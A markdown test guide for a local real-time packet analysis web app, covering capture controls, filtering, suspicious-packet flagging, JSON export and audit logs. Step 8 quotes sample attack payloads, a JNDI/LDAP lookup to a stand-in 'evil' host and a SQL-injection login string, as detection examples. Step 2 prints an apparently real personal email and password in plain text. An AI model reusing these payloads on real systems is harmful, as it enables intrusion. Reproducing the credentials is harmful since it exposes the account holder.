# Real-Time Packet Analysis - Quick Test Guide

## ✅ System Status
- **Backend**: http://localhost:4000 (Running on port 4000)
- **Frontend**: http://localhost:5173 (Running on port 5173)
- **WebSocket**: ws://localhost:4000/socket.io/?EIO=4&transport=websocket ✅ Connected

## 🚀 Testing Real-Time Packet Analysis

### Step 1: Open the Application
Navigate to: **http://localhost:5173**

### Step 2: Login
- Email: `jumajamil314@gmail.com`
- Password: `Jamil2003`
- Role: Admin (has access to all features)

### Step 3: Navigate to Packets Page
1. Click **"📦 Packets"** in the left sidebar
2. You should see:
   - Control section with "▶ Start Capture" button
   - Status metrics (Total Packets: 0, Suspicious: 0, Status: 🔴 IDLE)
   - Filter controls (Protocol dropdown, Search box)
   - Empty table/list (no packets yet)

### Step 4: Start Live Packet Capture
1. Click the **"▶ Start Capture"** button
2. Observe:
   - Button changes to **"⏹ Stop Capture"** (red)
   - Status indicator changes to **"🟢 LIVE"** (green with pulsing dot)
   - Packets begin appearing in real-time
   - "Total Packets" counter increments every ~200ms
   - Tables/cards populate with live packet data

### Step 5: Live Packet Stream Observations
You should see packets appearing with:
- **Timestamp**: Time packet was captured (e.g., "14:35:42")
- **Source IP**: Origin IP (e.g., "10.0.0.12")
- **Destination IP**: Target IP (e.g., "10.0.0.1")
- **Protocol**: TCP, UDP, HTTP, DNS, etc.
- **Length**: Packet size in bytes
- **Info**: Detailed packet information
- **Red Highlighting**: Suspicious packets flagged with ⚠️

### Step 6: Test Protocol Filtering
While capture is running:
1. Click the **Protocol** dropdown
2. Select **"TCP"**
3. Observe:
   - Packets filter to show only TCP traffic
   - Packet count updates in real-time
4. Try other protocols: UDP, DNS, HTTP
5. Select **"All protocols"** to see everything

### Step 7: Test Search / Full-Text Filter
While capture is running:
1. Type in the **Search** box: `suspicious`
2. Observe:
   - Packets filter to matches in src, dst, info
   - Search works on partial matches
3. Try searching for:
   - IP addresses: `10.0.0.15`
   - Protocols: `DNS`, `SQL`
   - Attack patterns: `malformed`, `checksum`, `jndi`

### Step 8: Suspicious Packet Detection
1. Observe packets highlighted in **red** with ⚠️ icon
2. These are flagged as suspicious because they contain:
   - Suspicious ports (445=SMB, 3389=RDP)
   - Malformed patterns (checksum, JNDI, SQL injection)
   - Large packets (>1400 bytes)
3. Example suspicious packets:
   ```
   ⚠️ "SYN 445 -> possible SMB"
   ⚠️ "POST /login username=admin'--"
   ⚠️ "${jndi:ldap://evil/exp}"
   ⚠️ "Malformed segment checksum"
   ```

### Step 9: Monitor Live Statistics
- **Total Packets**: Increments as packets are captured
- **Suspicious**: Counts only red-flagged packets
- **Status**: Shows 🟢 LIVE while capturing
- Updates in real-time as packets arrive

### Step 10: Stop Capture
1. Click **"⏹ Stop Capture"** button
2. Observe:
   - Button reverts to **"▶ Start Capture"** (blue)
   - Status changes to **"🔴 IDLE"** (red)
   - Pulsing dot disappears
   - Packet stream stops (no new packets appear)
   - Captured data remains on screen for review

### Step 11: Export Packets
1. With capture stopped, click **"📥 Export as JSON"**
2. Browser downloads file: `packets-TIMESTAMP.json`
3. File contains:
   ```json
   {
     "exportTime": "2026-04-05T14:35:42Z",
     "totalPackets": 142,
     "packets": [
       {
         "id": "pkt_...",
         "src": "10.0.0.12",
         "dst": "10.0.0.1",
         "protocol": "TCP",
         "length": 512,
         "info": "SYN 445",
         "timestamp": "2026-04-05T14:35:43Z",
         "suspicious": false
       },
       ...
     ]
   }
   ```

### Step 12: View Audit Trail
1. Click **"📋 Audit Logs"** in sidebar (Admin only)
2. Filter by **Event Type**: `SUSPICIOUS_PACKET_DETECTED`
3. See entries like:
   ```
   SUSPICIOUS_PACKET_DETECTED | HIGH | 14:35:43
   User: admin@test.com
   Target: Packet src=10.0.0.15 dst=10.0.0.30
   Reason: Contains SQL injection attempt
   ```

### Step 13: Test Mobile Responsiveness
1. Open DevTools: Press `F12`
2. Click device toolbar (mobile view)
3. Navigate to Packets page
4. Verify:
   - Table converts to card layout
   - Controls stack vertically
   - Packet cards display all information
   - Capture works identically

### Step 14: Restart Capture Cycle
1. Start a new capture
2. Let it run for 30 seconds
3. Note packet growth rate (~5 packets/second)
4. Stop and export
5. Verify exported file contains all captured packets

## 📊 Expected Metrics
| Metric | Expected Value |
|--------|-----------------|
| Capture Start Latency | < 100ms |
| Packet Emission Rate | ~5 packets/second |
| UI Update Latency | < 50ms per packet |
| Max Buffered Packets | 500 |
| WebSocket Message Size | ~300 bytes/packet |
| Memory per Packet | ~200 bytes |

## 🔴 Potential Issues & Solutions

### Issue: Packets not appearing after clicking "Start Capture"
**Solution**: 
1. Check backend is running: `npm start` in backend folder
2. Check WebSocket connection in DevTools Console
3. Reload page and retry

### Issue: "Export as JSON" button disabled
**Solution**:
- You must capture at least 1 packet before export is enabled
- Start a capture session first

### Issue: Protocol filter not working
**Solution**:
- Make sure capture is ACTIVE (🟢 LIVE)
- Filters only work on live packets
- Try searching instead if dropdown not responsive

### Issue: Suspicious packets not appearing
**Solution**:
- Some packets are randomly suspicious based on detection rules
- Keep capture running for 30+ seconds to see suspicious patterns
- Look for packets with telltale patterns like "malformed", "checksum", "jndi"

### Issue: WebSocket "connection failed" error
**Solution**:
1. Ensure backend is running: check `http://localhost:4000`
2. Clear browser cache: Ctrl+Shift+Delete
3. Disable browser extensions (especially security-related)
4. Check firewall allows localhost connections

### Issue: Export creates empty JSON
**Solution**:
- Export only works with captured packets
- Run capture for at least 5 seconds before exporting
- Check that packets are visible in the table before exporting

## 🎯 Success Criteria
✅ Packets appear in real-time when capture starts
✅ Packet count increments every ~200ms
✅ Protocol filtering works correctly
✅ Search queries match packets in real-time
✅ Suspicious packets highlighted in red
✅ Stop capture halts new packet flow
✅ Export downloads JSON with all packets
✅ Mobile view displays packets as cards
✅ Audit trail logs suspicious packets as HIGH severity

---

**Test Duration**: ~5-10 minutes
**Difficulty**: Easy (just click buttons and observe)
**No Special Setup**: Just use default credentials and test from browser
